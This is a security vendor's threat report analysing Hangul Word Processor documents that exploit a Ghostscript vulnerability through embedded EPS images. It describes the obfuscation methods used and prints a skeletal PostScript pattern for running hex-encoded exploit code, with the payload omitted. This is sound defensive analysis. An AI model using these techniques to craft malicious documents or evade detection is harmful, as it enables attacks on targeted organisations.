Report Vol.99 2020 Q2
ASEC (AhnLab Security Emergency-response Center) is a global security response group consisting of
malware analysts and security experts. This report is published by ASEC and focuses on the most significant
security threats and latest security technologies to guard against such threats. For further details, please visit

Malicious Hangul Word Processor Files
Exploiting Ghostscript Vulnerability

HWP (Hangul Word Processor) is a word processing application that is relatively popular
in South Korea and in parts of APAC region. HWP files exploiting Ghostscript vulnerability
(CVE-2017-8291) was first discovered in mid-2017. And almost three years later, the same
vulnerability is still being exploited even after countless security updates and security
advisories for HWP files.
ASEC (AhnLab Security Emergency-response Center) analysis team has released a report
regarding the malicious HWP files exploiting Ghostscript vulnerability in 2019. However, not
much has changed since then. The main target for the attack and the vulnerability exploited
for the attacks remain the same. The main target of the attacks are public sectors and
cryptocurrency-related organizations.
Apart from the shellcode and operational differences, what else has changed about the attack
methods? This analysis report will examine the HWP file attacks that exploited Ghostscript
vulnerability in numerous occasions and introduce the significant changes that occurred in
2020.
1. Types of Malicious HWP Files Discovered in 2020
Details regarding the HWP files that exploited the Ghostscript (CVE-2017-8291) vulnerability
can be seen in Figure 1. However, Figure 1 only shows a sample of the malicious HWP files that
were discovered from January to May of this year.

Table 1. Sample of the malicious HWP files that were discovered in 2020

Attacks using malicious HWP files mostly targeted a certain profession or group by
impersonating as a government institution, organization, or individual job seeker.
The number of the overall attacks had increased from April 2020 due to the escalation of
malware exploiting the COVID-19 situation. Even though the number of attacks had increased,
the file details remained consistent. In fact, HWP files distributed across Incheon Metropolitan
City, Busan Metropolitan City, and Jeollanam-do Province had only slight alterations.

2. Analysis of Ghostscript Vulnerability and Malicious EPS Files
As explained in previous reports, EPS (Encapsulated PostScript) file inserted in the HWP
document is the main reason behind the vulnerability. The malicious EPS object, which is an
abnormal image format, is inserted into the document. The malware is executed when the
Ghostscript interpreter attempts to process the EPS object to display the page on the screen.
Thus, the attacker can produce numerous HWP files with various contents as long as the
attacker had already developed an EPS file.

Figure 1. Simplified attack method as of April 2020

EPS files are commonly written in PostScript language. The attacker has been using the
characteristics of the script language to change the code into various forms and ultimately
avoid detection. Examples include garbage code insertion, variable substitution, and XOR
encoding after saving the script in the <> hexadecimal data value.
However, the malicious HWP files that were discovered this year changed its PostScript code
as of April. Instead of using previous methods, such as XOR encoding or obfuscation method,
it turned to a totally new method. It started to use the PostScript syntax, which is a simple yet
powerful method of executing malicious functions.
Simplified form indicates that it makes it harder to distinguish file-based malware from normal
EPS files. The attacker could have avoided detection by removing the repetitive XOR encoding
or code, and syntax substitution. However, that is not the route the attacker chose.

But not everything had changed. In fact, some things remained the same even after June 2017.
One of them being the CVE-2017-8291 vulnerability exploit code executed in the memory.

3. Changes in the Recent PostScript Code
The new EPS file method uses PostScript syntax, as shown in Figure 5.

/literal <hex..................data> def literal cvx exec
Figure 5. Part of the Postscript code that was recently changed

The literal data value expressed in hexadecimal is included in the < >, and after this literal
object is defined as a variable through def. Then, it changes the object to be executable only
through "cvx exec" and executes it subsequently. When the hexadecimal data in the < > is
executed, the shellcode is also executed. The data within the < > is the PostScript code that
executes the shellcode by creating the vulnerability. Three variable names (/image, /tomato, /
airplane) were used in the EPS files discovered between April and May of this year.

Figure 6. Sample of EPS file vulnerability execution code

Since the operational method remains consistent, the overall flow of stack pointer
movement, creation of type confusion vulnerability, shellcode and gadget execution using
the altered type object remains the same even after the code form had changed.

4. Conclusion
Since attacks using HWP files are targeted towards various groups, there is a possibility that
the above malicious EPS file form might change once again. Thus, it is important to constantly
analyze and assess the possibility of the code pattern being temporary or being continuously
used in times to come.
